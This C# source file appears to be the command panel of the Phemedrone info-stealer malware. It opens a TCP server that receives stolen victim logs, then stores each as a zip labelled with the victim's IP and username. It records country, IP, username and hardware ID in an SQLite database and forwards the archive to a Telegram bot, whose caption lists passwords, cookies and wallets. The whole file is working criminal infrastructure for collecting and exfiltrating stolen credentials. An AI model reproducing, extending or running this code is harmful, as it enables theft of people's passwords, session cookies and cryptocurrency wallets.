using System.Net;

namespace Phemedrone.Panel;

static class Program
{
    public static int Logs;
    public static int Port = 0;
    public static IPAddress ip;
    public static bool SendTG = false;
    public static string botToken;
    public static string chatID;


    [STAThread]
    public static void Main()
    {
        Helper.CheckDirect();
        Helper.LoadCfg();
        Console.Title = $"phemedrone panel >> by thedyer & mitsuaka | Logs Count: {Logs}      Port: {Port}";
        Console.Clear();
        Console.CursorVisible = false;

        TcpServer receiver = new TcpServer(ip, Port);

        var database = new DatabaseWorker("files\\users\\clients.sqlite");
        database.FirstInit();

        var cTable = new ConsoleTable();

        var clients = database.GetClients();
        cTable.Draw();

        foreach (var client in clients)
        {
            cTable.AddItem(new LogEntry
            {
                Values = new object[]
                {
                    client[0],
                    IPAddress.Parse(client[1]),
                    client[2],
                    client[3],
                    client[4]
                }
            }, true);
            Logs++;
            Console.Title = $"phemedrone panel >> by thedyer & mitsuaka | Logs Count: {Logs}      Port: {Port}";
        }

        receiver.OnLogReceived += (sender, e) =>
        {
            if (!File.Exists($"logs\\{e.IP}-{e.Username}-Phemedrone-Report.zip"))
            {
                File.WriteAllBytes($"logs\\{e.IP}-{e.Username}-Phemedrone-Report.zip", e.LogBytes);

                cTable.AddItem(new LogEntry
                {
                    Values = new object[] { e.CountryCode, e.IP, e.Username, e.HWID, e.logInfo, e.Tag }
                }, true);

                database.AddClient(e.CountryCode, e.IP.ToString(), e.Username, e.HWID, e.logInfo, e.Tag);

                Logs++;
                Console.Title = $"phemedrone panel >> by thedyer & mitsuaka | Logs Count: {Logs}      Port: {Port}";
                if (SendTG)
                {
                    string caption = "New Log! | by @thedyer & @reyvortex" +
                                     $"\n- Tag: {e.Tag}" +
                                     $"\n- IP: {e.IP}" +
                                     $"\n- Country Code: {e.CountryCode}" +
                                     $"\n- Username: {e.Username}" +
                                     $"\n- Log Info: {e.logInfo} (passwods:cookies:wallets)" +
                                     $"\n- Passwords Tags: {e.PassTags}\n- Cookies Tags: {e.CookiesTags}";
                    Telegram.Send(botToken, chatID, $"logs\\{e.IP}-{e.Username}-Phemedrone-Report.zip",
                        $"{e.IP}-{e.Username}-Phemedrone-Report.zip", caption);
                }
            }
            else
            {
                File.WriteAllBytes($"logs\\{e.IP}-{e.Username}-Phemedrone-Report.zip", e.LogBytes);
                if (SendTG)
                {
                    string caption = "New Log! | by @thedyer & @reyvortex" +
                                     $"\n- Tag: {e.Tag}" +
                                     $"\n- IP: {e.IP}" +
                                     $"\n- Country Code: {e.CountryCode}" +
                                     $"\n- Username: {e.Username}" +
                                     $"\n- Log Info: {e.logInfo} (passwods:cookies:wallets)" +
                                     $"\n- Passwords Tags: {e.PassTags}\n- Cookies Tags: {e.CookiesTags}";
                    Telegram.Send(botToken, chatID, $"logs\\{e.IP}-{e.Username}-Phemedrone-Report.zip",
                        $"{e.IP}-{e.Username}-Phemedrone-Report.zip", caption);
                }
            }
        };

        cTable.StartKeyListener();
        receiver.StartServer();
        Thread.Sleep(-1);
    }
}